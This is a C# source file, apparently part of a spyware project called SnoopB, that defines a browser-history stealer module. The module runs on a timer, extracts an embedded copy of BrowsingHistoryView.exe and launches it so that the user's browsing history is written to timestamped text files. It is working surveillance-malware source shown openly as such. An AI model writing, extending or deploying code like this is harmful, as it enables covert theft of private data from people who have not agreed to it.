using System;
using System.IO;
using SnoopB.Configuration;
using SnoopB.Resources;

namespace SnoopB.Modules.BrowserHistoryStealer
{
    //Using external resources, save the history in disk, in each execution
    internal class BrowserHistoryStealerModule : Module
    {
        private const string _browserTool = "BrowsingHistoryView.exe";

        public BrowserHistoryStealerModule(int minutesInterval): base(minutesInterval)
        {
        }

        #region [ Module ]

        public new static string ModuleId
        {
            get { return "4b49364d-205e-48a5-8283-97265f848f89"; }
        }

        protected override void ExecuteInternal()
        {
            InvokeTool(_browserTool);
        }

        #endregion

        private void InvokeTool(string browserTool)
        {
            var dest =  ResourceManager.ExtractResource(browserTool);

            if (string.IsNullOrEmpty(dest))
                return;

            InitProcess(dest);
        }

        private void InitProcess(string exePath)
        {
            var param = string.Format(" /stext {0}\\{1}-{2}.txt", Configurator.Instance.CurrentExecutionPath, Path.GetFileNameWithoutExtension(exePath), DateTime.Now.ToString("dd-MM-yyyy--HH-mm-ss"));

            System.Diagnostics.Process.Start(exePath, param);
        }
    }
}